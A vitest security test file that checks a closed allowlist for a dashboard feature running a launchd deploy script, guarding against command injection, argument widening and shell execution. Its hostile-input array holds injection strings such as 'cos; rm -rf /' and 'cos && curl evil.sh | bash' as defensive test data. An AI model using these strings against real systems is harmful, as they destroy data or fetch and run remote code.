/**
 * THE ALLOWLIST IS CLOSED — the test that has to fail if it stops being.
 *
 * This is the adversarial arm for the one genuinely dangerous thing in this
 * feature: a web page that manipulates launchd on the operator's Mac. What is
 * pinned here is not "the happy path works" but the four ways this becomes a
 * remote-execution seam:
 *
 *   1. the TABLE grows an entry (a third operation, or a `--force`);
 *   2. an operation is reachable by NAME from a caller's string;
 *   3. the slug widens into a flag, a path, or shell metacharacters;
 *   4. the transport becomes a shell, so any of the above starts mattering.
 *
 * Class-11 check on this file itself: every arm asserts the REFUSAL, and each
 * one is written so it would pass trivially if `runCrewOp` simply threw on
 * everything — so the last describe drives the ALLOWED shape through the same
 * door and asserts the exact argv, cwd and program. A gate that only ever says
 * no is not a gate, it is a wall with a test.
 */
import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest'

const { mockExecFile, mockExistsSync } = vi.hoisted(() => ({
  mockExecFile: vi.fn(),
  mockExistsSync: vi.fn(() => true),
}))

// `promisify(execFile)` reads the custom-promisified symbol when present; give
// the mock one so the module under test gets our async fn, unmodified.
vi.mock('node:child_process', () => {
  const fn = Object.assign(mockExecFile, {
    [Symbol.for('nodejs.util.promisify.custom')]: mockExecFile,
  })
  return { execFile: fn, default: { execFile: fn } }
})
vi.mock('node:fs', () => ({
  default: { existsSync: mockExistsSync },
  existsSync: mockExistsSync,
}))

import {
  CrewOpRefused,
  isCrewOp,
  OPS,
  deployScriptPath,
  lastLine,
  runCrewOp,
  RESERVED_SLUGS,
  SLUG_RE,
} from './crew-ops'

beforeEach(() => {
  vi.clearAllMocks()
  vi.stubEnv('CABINET_ROOT', '/srv/cabinet')
  mockExistsSync.mockReturnValue(true)
  mockExecFile.mockResolvedValue({ stdout: 'deployed: com.cabinet.officer.cos\n', stderr: '' })
})
afterEach(() => vi.unstubAllEnvs())

describe('the table is exactly two operations', () => {
  it('wake and sleep, and nothing else', () => {
    // If this fails because an operation was ADDED, that is the review moment
    // this test exists to force — not a number to bump.
    expect(Object.keys(OPS).sort()).toEqual(['sleep', 'wake'])
  })

  it('each one is a single flag plus the officer id — no --force, no path, no extra word', () => {
    expect(OPS.wake.args('cos')).toEqual(['--officer', 'cos'])
    expect(OPS.sleep.args('cos')).toEqual(['--stop', 'cos'])
    for (const op of Object.values(OPS)) {
      const argv = op.args('cos')
      expect(argv).toHaveLength(2)
      expect(argv[0].startsWith('--')).toBe(true)
      expect(argv).not.toContain('--force')
      expect(argv).not.toContain('--all')
    }
  })

  it('the script path is derived from the checkout root, never from a caller', () => {
    expect(deployScriptPath()).toBe('/srv/cabinet/cabinet/scripts/deploy-mac.sh')
  })
})

describe('an operation that is not in the table never runs', () => {
  it('refuses an unknown op name and executes nothing', async () => {
    await expect(
      runCrewOp('all' as unknown as 'wake', 'cos')
    ).rejects.toBeInstanceOf(CrewOpRefused)
    expect(mockExecFile).not.toHaveBeenCalled()
  })

  it('refuses a prototype-shaped name (`toString`, `constructor`) rather than resolving it', async () => {
    // These resolve to something TRUTHY through the prototype chain, so a
    // `if (!OPS[op])` guard would let them past and crash on `entry.args`.
    for (const name of ['toString', 'constructor', '__proto__', 'hasOwnProperty']) {
      expect(isCrewOp(name)).toBe(false)
      await expect(runCrewOp(name as unknown as 'wake', 'cos')).rejects.toBeInstanceOf(
        CrewOpRefused
      )
    }
    expect(mockExecFile).not.toHaveBeenCalled()
  })
})

describe('the slug cannot widen into anything else', () => {
  const hostile = [
    'cos; rm -rf /',
    'cos && curl evil.sh | bash',
    'cos $(whoami)',
    'cos `id`',
    // The script's OWN flags. These matched the first version of the slug
    // pattern (a hyphen is legal IN a slug, and nothing said it could not
    // LEAD), which would have let the one interpolated field widen the
    // allowlist into the very operations it exists to exclude.
    '--force',
    '--all',
    '-officer',
    '-',
    // `deploy-mac.sh`'s wildcard for both legs. `--stop all` boots out every
    // com.cabinet.* LaunchAgent, this dashboard included.
    'all',
    '../../etc/passwd',
    '/absolute/path',
    'cos\nall',
    'cos all',
    'COS',
    'cos.plist',
    '',
    'a'.repeat(65),
  ]

  it('every hostile id is refused before anything runs', async () => {
    for (const slug of hostile) {
      await expect(runCrewOp('wake', slug)).rejects.toBeInstanceOf(CrewOpRefused)
    }
    expect(mockExecFile).not.toHaveBeenCalled()
  })

  it('the pattern allows only lowercase, digits and hyphen — and never a LEADING hyphen', () => {
    expect(SLUG_RE.test('cos')).toBe(true)
    expect(SLUG_RE.test('first-lane-ceo')).toBe(true)
    expect(SLUG_RE.test('cos ')).toBe(false)
    expect(SLUG_RE.test('cos;id')).toBe(false)
    expect(SLUG_RE.test('--force')).toBe(false)
    expect(SLUG_RE.test('-x')).toBe(false)
  })

  it('the wildcard is reserved by NAME, because it is slug-shaped', () => {
    // `all` passes the pattern and always will; it has to be excluded as a
    // word, not as a character class.
    expect(SLUG_RE.test('all')).toBe(true)
    expect(RESERVED_SLUGS.has('all')).toBe(true)
  })
})

describe('a missing script is a refusal, not a silent success', () => {
  it('says so and runs nothing', async () => {
    mockExistsSync.mockReturnValue(false)
    await expect(runCrewOp('wake', 'cos')).rejects.toBeInstanceOf(CrewOpRefused)
    expect(mockExecFile).not.toHaveBeenCalled()
  })
})

describe('the allowed shape actually goes through — and as argv, not a shell', () => {
  it('wake runs bash <script> --officer <slug> with cwd at the checkout root', async () => {
    const result = await runCrewOp('wake', 'cos')
    expect(mockExecFile).toHaveBeenCalledTimes(1)
    const [program, argv, options] = mockExecFile.mock.calls[0]
    expect(program).toBe('bash')
    expect(argv).toEqual(['/srv/cabinet/cabinet/scripts/deploy-mac.sh', '--officer', 'cos'])
    expect(options.cwd).toBe('/srv/cabinet')
    // No `shell` option anywhere: with one, every hostile string above would
    // start mattering again.
    expect(options.shell).toBeUndefined()
    expect(result).toMatchObject({ ok: true, op: 'wake', slug: 'cos' })
  })

  it('sleep runs the same script with --stop', async () => {
    await runCrewOp('sleep', 'first-lane-ceo')
    const [, argv] = mockExecFile.mock.calls[0]
    expect(argv).toEqual([
      '/srv/cabinet/cabinet/scripts/deploy-mac.sh',
      '--stop',
      'first-lane-ceo',
    ])
  })

  it('a script that RAN and failed is ok:false with its own words — not a throw', async () => {
    mockExecFile.mockRejectedValue({
      stdout: '',
      stderr: 'deploy-mac.sh: bootstrap failed for com.cabinet.officer.cos\n',
      message: 'Command failed',
    })
    const result = await runCrewOp('wake', 'cos')
    expect(result.ok).toBe(false)
    expect(result.detail).toContain('bootstrap failed')
  })
})

describe('lastLine — enough to diagnose, never a dump', () => {
  it('takes the last non-empty line', () => {
    expect(lastLine('one\n\ntwo\n  three  \n\n')).toBe('three')
  })
  it('caps long output', () => {
    expect(lastLine('x'.repeat(1000), 40)).toHaveLength(40)
  })
  it('empty in, empty out', () => {
    expect(lastLine('')).toBe('')
  })
})
